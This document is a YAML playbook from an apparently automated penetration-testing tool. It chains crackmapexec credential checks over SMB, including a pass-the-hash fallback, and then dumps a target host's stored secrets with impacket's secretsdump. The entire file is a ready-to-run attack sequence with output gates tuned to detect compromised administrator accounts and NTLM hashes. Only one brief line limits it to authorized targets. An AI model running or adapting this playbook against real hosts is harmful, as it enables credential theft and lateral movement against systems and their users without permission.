# Mech-Unit attack intent — SMB credential validation + secret dump.
# The cross-domain consumer of the AP capitalization subgraph: captured
# credential material (creds.hashes / creds.valid_candidates) is validated
# against SMB and cashed out via secretsdump.
id: smb_credential_relay
name: SMB Credential Validation + Dump
category: network
operator_label: "Use captured credentials on an SMB host"
operator_description: >
  Validates captured username/password material against the target host's
  SMB endpoint, then dumps local secrets when the credentials land.
  The natural next move after responder/handshake captures.
outcome: "Validated credentials + dumped host secrets, or auth failure"
grants: [creds.valid, host.secrets]
time_to_impact: minutes
noise: low
risk_notes: >
  Failed logins generate account-lockout pressure. Only against
  authorized targets.

preconditions:
  - probe: tools_present
    with: [crackmapexec]

plan:
  - step: validate_creds
    tool: crackmapexec_exec
    args:
      target: "{{ target.host }}"
      username: "{{ target.username }}"
      password: "{{ target.password }}"
      protocol: smb
    max_wait: 120
    gate:
      output: "Pwn3d|SUCCESS|\\[\\+\\]"
    on_fail: warn
    fallbacks:
      - step: try_hash
        tool: crackmapexec_exec
        args:
          target: "{{ target.host }}"
          username: "{{ target.username }}"
          protocol: smb
        gate:
          output: "Pwn3d|SUCCESS|\\[\\+\\]"

  - step: dump_secrets
    tool: impacket_tools
    args:
      tool: secretsdump
      target: "{{ target.host }}"
    max_wait: 600
    gate:
      output: "Dumping|Administrator|NTLM|:::"
    on_fail: warn

artifacts:
  secrets_log: "{{ plan_dir }}/secretsdump.log"

llm_required: false
